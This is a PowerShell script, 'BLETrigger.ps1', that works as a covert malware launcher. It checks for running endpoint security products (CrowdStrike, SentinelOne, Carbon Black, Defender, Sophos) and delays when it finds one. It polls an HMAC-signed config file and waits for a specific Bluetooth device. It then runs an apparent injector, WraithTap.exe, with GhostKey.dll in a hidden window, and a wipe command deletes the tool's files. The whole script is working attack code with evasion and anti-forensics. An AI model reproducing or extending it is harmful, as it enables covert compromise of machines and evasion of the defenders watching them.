
# BLETrigger.ps1 — Secure Trigger with EDR evasion and signed command validation

$knownDeviceID = "GhostWhisperer"
$authToken = "U2FsdGVkX1+RAVEN-OK=="
$injectCmd = "$PSScriptRoot\WraithTap.exe $PSScriptRoot\GhostKey.dll"
$cfgPath = "C:\ProgramData\.ghost.cfg"
$key = 'RavenLives'

function X([string]$d,[string]$k) {
  $kb=[Text.Encoding]::UTF8.GetBytes($k)
  $db=[Text.Encoding]::UTF8.GetBytes($d)
  $h=New-Object Security.Cryptography.HMACSHA256
  $h.Key=$kb
  ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
}

function Validate-Cfg {
  if (!(Test-Path $cfgPath)) { return $null }
  $j=Get-Content $cfgPath | ConvertFrom-Json
  $c=$j.command; $t=$j.timestamp; $s=$j.signature
  $dt=[datetime]::Parse($t)
  if ((Get-Date).ToUniversalTime().Subtract($dt).TotalMinutes -gt 10) { return $null }
  $check=X "$c|$t" $key
  if ($s -eq $check) { return $c }
  return $null
}

function Check-EDR {
  $x="Crowd,Sentinel,Carbon,Defend,Sophos" -split ","
  Get-Service | Where-Object { $x -match $_.Name -or $x -match $_.DisplayName }
}

function D($cmd) {
  if ($cmd -eq 'FIRE') {
    Start-Process -WindowStyle Hidden -FilePath "$PSScriptRoot\WraithTap.exe" -ArgumentList "$PSScriptRoot\GhostKey.dll"
  } elseif ($cmd -eq 'WIPE') {
    Remove-Item "$PSScriptRoot\WraithTap.exe","$PSScriptRoot\GhostKey.dll","$PSScriptRoot\SilentBloom.ps1" -Force -ErrorAction SilentlyContinue
  }
}

if (Check-EDR) { Start-Sleep 300 }

while ($true) {
  $cmd=Validate-Cfg
  if ($cmd) { D $cmd; break }
  $d=Get-PnpDevice -Class Bluetooth -Status OK | Where { $_.FriendlyName -eq $knownDeviceID }
  if ($d -and ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($authToken)) -eq "RAVEN-OK")) {
    D 'FIRE'; break
  }
  Start-Sleep 5
}
